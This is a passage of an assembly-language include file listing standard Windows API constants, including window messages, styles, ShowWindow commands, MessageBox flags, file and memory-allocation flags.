   WM_RENDERFORMAT     = 0305h
   WM_RENDERALLFORMATS = 0306h
   WM_DESTROYCLIPBOARD = 0307h
   WM_DRAWCLIPBOARD    = 0308h
   WM_PAINTCLIPBOARD   = 0309h
   WM_VSCROLLCLIPBOARD = 030Ah
   WM_SIZECLIPBOARD    = 030Bh
   WM_ASKCBFORMATNAME  = 030Ch
   WM_CHANGECBCHAIN    = 030Dh
   WM_HSCROLLCLIPBOARD = 030Eh
   WM_QUERYNEWPALETTE  = 030Fh
   WM_PALETTEISCHANGING = 0310h
   WM_PALETTECHANGED   = 0311h

   WM_PENWINFIRST      equ 0380h
   WM_PENWINLAST       equ 038Fh

   WM_COALESCE_FIRST  equ 0390h
   WM_COALESCE_LAST   equ 039Fh

   ;  private window messages start here
   WM_USER             = 0400H
   ENDIF           ; NOWM

   ; WM_MOUSEACTIVATE Return Codes
   MA_ACTIVATE       =  1
   MA_ACTIVATEANDEAT =  2
   MA_NOACTIVATE     =  3

   ; Size message commands
   SIZENORMAL       = 0
   SIZEICONIC       = 1
   SIZEFULLSCREEN   = 2
   SIZEZOOMSHOW     = 3
   SIZEZOOMHIDE     = 4

   ; ShowWindow() Commands
   SW_HIDE            = 0
   SW_SHOWNORMAL      = 1
   SW_NORMAL          = 1
   SW_SHOWMINIMIZED   = 2
   SW_SHOWMAXIMIZED   = 3
   SW_MAXIMIZE        = 3
   SW_SHOWNOACTIVATE  = 4
   SW_SHOW            = 5
   SW_MINIMIZE        = 6
   SW_SHOWMINNOACTIVE = 7
   SW_SHOWNA          = 8
   SW_RESTORE         = 9

   ; Old ShowWindow() Commands
   HIDE_WINDOW        = 0
   SHOW_OPENWINDOW    = 1
   SHOW_ICONWINDOW    = 2
   SHOW_FULLSCREEN    = 3
   SHOW_OPENNOACTIVATE= 4

   ;  identifiers for the WM_SHOWWINDOW message
   SW_PARENTCLOSING =  1
   SW_OTHERZOOM     =  2
   SW_PARENTOPENING =  3
   SW_OTHERUNZOOM   =  4
   ;
   ; Key state masks for mouse messages
   ;
   MK_LBUTTON       = 0001h
   MK_RBUTTON       = 0002h
   MK_SHIFT         = 0004h
   MK_CONTROL       = 0008h
   MK_MBUTTON       = 0010h
   ;
   ; Class styles
   ;
   CS_VREDRAW         = 0001h
   CS_HREDRAW         = 0002h
   CS_KEYCVTWINDOW    = 0004H
   CS_DBLCLKS         = 0008h
   ;                    0010h reserved
   CS_OWNDC           = 0020h
   CS_CLASSDC         = 0040h
   CS_PARENTDC        = 0080h
   CS_NOKEYCVT        = 0100h
   CS_SAVEBITS        = 0800h
   CS_NOCLOSE         = 0200h
   CS_BYTEALIGNCLIENT = 1000h
   CS_BYTEALIGNWINDOW = 2000h
   CS_GLOBALCLASS     = 4000h    ; Global window class

   ;
   ; Special CreateWindow position value
   ;
   CW_USEDEFAULT   EQU    8000h

   ;
   ; Windows styles
   ;
   WS_OVERLAPPED   = 000000000h
   WS_ICONICPOPUP  = 0C0000000h
   WS_POPUP        = 080000000h
   WS_CHILD        = 040000000h
   WS_MINIMIZE     = 020000000h
   WS_VISIBLE      = 010000000h
   WS_DISABLED     = 008000000h
   WS_CLIPSIBLINGS = 004000000h
   WS_CLIPCHILDREN = 002000000h
   WS_MAXIMIZE     = 001000000h
   WS_CAPTION      = 000C00000h     ; WS_BORDER | WS_DLGFRAME
   WS_BORDER       = 000800000h
   WS_DLGFRAME     = 000400000h
   WS_VSCROLL      = 000200000h
   WS_HSCROLL      = 000100000h
   WS_SYSMENU      = 000080000h
   WS_THICKFRAME   = 000040000h
   WS_HREDRAW      = 000020000h
   WS_VREDRAW      = 000010000h
   WS_GROUP        = 000020000h
   WS_TABSTOP      = 000010000h
   WS_MINIMIZEBOX  = 000020000h
   WS_MAXIMIZEBOX  = 000010000h

   ; Common Window Styles

   WS_OVERLAPPEDWINDOW = WS_OVERLAPPED OR WS_CAPTION OR WS_SYSMENU OR WS_THICKFRAME OR WS_MINIMIZEBOX OR WS_MAXIMIZEBOX
   WS_POPUPWINDOW  = WS_POPUP OR WS_BORDER OR WS_SYSMENU
   WS_CHILDWINDOW  = WS_CHILD
   WS_TILEDWINDOW  = WS_OVERLAPPEDWINDOW

   WS_TILED        = WS_OVERLAPPED
   WS_ICONIC       = WS_MINIMIZE
   WS_SIZEBOX      = WS_THICKFRAME

   ; Extended Window Styles (low words)
   WS_EX_DLGMODALFRAME  = 0001
   WS_EX_DRAGOBJECT     = 0002
   WS_EX_NOPARENTNOTIFY = 0004
   WS_EX_TOPMOST        = 0008


   ; PeekMessage() Options
   PM_NOREMOVE    = 0000h
   PM_REMOVE      = 0001h
   PM_NOYIELD     = 0002h

   ; SetWindowPos Flags
   SWP_NOSIZE       =  0001h
   SWP_NOMOVE       =  0002h
   SWP_NOZORDER     =  0004h
   SWP_NOREDRAW     =  0008h
   SWP_NOACTIVATE   =  0010h
   SWP_DRAWFRAME    =  0020h
   SWP_SHOWWINDOW   =  0040h
   SWP_HIDEWINDOW   =  0080h
   SWP_NOCOPYBITS   =  0100h
   SWP_NOREPOSITION =  0200h
   ;
   ;  Predefined cursor & icon IDs
   ;
   IDC_ARROW       = 32512
   IDC_IBEAM       = 32513
   IDC_WAIT        = 32514
   IDC_CROSS       = 32515
   IDC_UPARROW     = 32516
   IDC_SIZE        = 32640
   IDC_ICON        = 32641
   IDC_SIZENWSE    = 32642
   IDC_SIZENESW    = 32643
   IDC_SIZEWE      = 32644
   IDC_SIZENS      = 32645

   IDI_APPLICATION = 32512
   IDI_HAND        = 32513
   IDI_QUESTION    = 32514
   IDI_EXCLAMATION = 32515
   IDI_ASTERISK    = 32516

   COLOR_SCROLLBAR           = 0
   COLOR_BACKGROUND          = 1
   COLOR_ACTIVECAPTION       = 2
   COLOR_INACTIVECAPTION     = 3
   COLOR_MENU                = 4
   COLOR_WINDOW              = 5
   COLOR_WINDOWFRAME         = 6
   COLOR_MENUTEXT            = 7
   COLOR_WINDOWTEXT          = 8
   COLOR_CAPTIONTEXT         = 9
   COLOR_ACTIVEBORDER        = 10
   COLOR_INACTIVEBORDER      = 11
   COLOR_APPWORKSPACE        = 12
   COLOR_HIGHLIGHT           = 13
   COLOR_HIGHLIGHTTEXT       = 14
   COLOR_BTNFACE             = 15
   COLOR_BTNSHADOW           = 16
   COLOR_GRAYTEXT            = 17
   COLOR_BTNTEXT             = 18

   ;
   ;  MessageBox type flags
   ;
   MB_OK                   = 0000H
   MB_OKCANCEL             = 0001H
   MB_ABORTRETRYIGNORE     = 0002H
   MB_YESNOCANCEL          = 0003H
   MB_YESNO                = 0004H
   MB_RETRYCANCEL          = 0005H

   MB_ICONHAND             = 0010H
   MB_ICONQUESTION         = 0020H
   MB_ICONEXCLAMATION      = 0030H
   MB_ICONASTERISK         = 0040H

   MB_DEFBUTTON1           = 0000H
   MB_DEFBUTTON2           = 0100H
   MB_DEFBUTTON3           = 0200H

   MB_APPLMODAL            = 0000H
   MB_SYSTEMMODAL          = 1000H
   MB_TASKMODAL            = 2000H

   MB_NOFOCUS              = 8000H

   ;
   ;  Conventional dialog box and message box command IDs
   ;
   IDOK     =   1
   IDCANCEL =   2
   IDABORT  =   3
   IDRETRY  =   4
   IDIGNORE =   5
   IDYES    =   6
   IDNO     =   7

   FILE_BEGIN      EQU     0
   FILE_CURRENT    EQU     1
   FILE_END        EQU     2

   SHARE_READ      EQU     000000001h
   SHARE_WRITE     EQU     000000002h
   MAX_PATH        EQU     260

   CREATE_NEW      EQU     1
   CREATE_ALWAYS   EQU     2
   OPEN_EXISTING   EQU     3
   OPEN_ALWAYS     EQU     4
   TRUNCATE_EXISTING   EQU     5

   GMEM_FIXED      EQU     000000000h
   GMEM_MOVEABLE       EQU     000000002h
   GMEM_NOCOMPACT      EQU     000000010h
   GMEM_NODISCARD      EQU     000000020h
   GMEM_ZEROINIT       EQU     000000040h
   GMEM_MODIFY     EQU     000000080h
   GMEM_DISCARDABLE        EQU     000000100h
   GMEM_NOT_BANKED     EQU     000001000h
   GMEM_SHARE      EQU     000002000h
   GMEM_DDESHARE       EQU     000002000h
   GMEM_NOTIFY     EQU     000004000h
   GMEM_LOWER      EQU     000001000h

   GENERIC_READ               = 80000000h
   GENERIC_WRITE              = 40000000h

   NORMAL_PRIORITY_CLASS       EQU     000000020h
   IDLE_PRIORITY_CLASS     EQU     000000040h
   HIGH_PRIORITY_CLASS     EQU     000000080h

   FALSE       EQU     0
   TRUE        EQU     1

   PAGE_EXECUTE_READWRITE      EQU 40h
   MEM_COMMIT          EQU 1000h
   MEM_RESERVE         EQU 2000h


